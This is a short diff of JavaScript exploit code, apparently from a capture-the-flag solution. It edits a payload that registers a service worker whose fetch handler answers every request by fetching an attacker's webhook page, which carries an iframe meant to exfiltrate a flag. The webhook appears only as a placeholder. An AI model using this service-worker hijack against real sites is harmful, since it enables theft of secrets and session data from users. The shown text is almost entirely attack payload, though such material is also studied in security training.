@@ -10,10 +10,11 @@ const ps = `(${() => {
 
 
 
-
+throw "see below";
 const sw = `(${() => {
 	self.addEventListener("fetch", e => {
-		e.respondWith(fetch(<YOUR WEBHOOK SITE WITH IFRAME TO EXFIL FLAG>));
+		// should be your webhook with iframe to exfil flag
+		e.respondWith(fetch("webhook"));
 	});
 }})()`;
 
